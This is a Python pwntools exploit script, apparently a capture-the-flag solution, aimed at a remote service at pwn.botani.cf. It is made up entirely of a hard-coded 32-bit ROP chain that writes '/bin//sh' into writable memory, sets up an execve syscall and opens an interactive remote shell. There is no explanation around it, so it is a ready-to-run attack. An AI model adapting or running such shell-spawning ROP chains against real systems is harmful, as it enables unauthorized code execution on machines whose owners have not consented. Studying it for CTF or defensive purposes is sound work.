from pwn import *

r = remote('pwn.botani.cf',3239)
#r = process('./ponari')

pop_eax  = 0x080bb416
pop_edx  = 0x0806ee3a
pop_esi  = 0x08049ac5
pop_edi  = 0x0804846f
pop_ebx  = 0x080481c9
eax_edx  = 0x0807b911 
pop_ecx  = 0x080c1594
syscall  = 0x08049451
writable = 0x080ea060
bin_sh   = "/bin"
bin_sh2  = "//sh"

buff=""
# write "/bin/sh" to some writable location
buff+="\x00\x00\xde\xde"
buff+="A"*12
buff+=p32(pop_eax)
buff+=p32(writable)
buff+=p32(pop_edx)
buff+=bin_sh
buff+=p32(eax_edx)

buff+=p32(pop_eax)
buff+=p32(writable+4)
buff+=p32(pop_edx)
buff+=bin_sh2
buff+=p32(eax_edx)



# rax = 0x0b
buff+=p32(pop_eax)
buff+=p32(0xb)

# ebx = writable location
buff+=p32(pop_ebx)
buff+=p32(writable)

buff+=p32(pop_edx)
buff+=p32(0x0)

# syscall
buff+=p32(syscall)
#buff+="dead"
#print buff
print r.recv()
r.sendline(buff)
r.interactive()

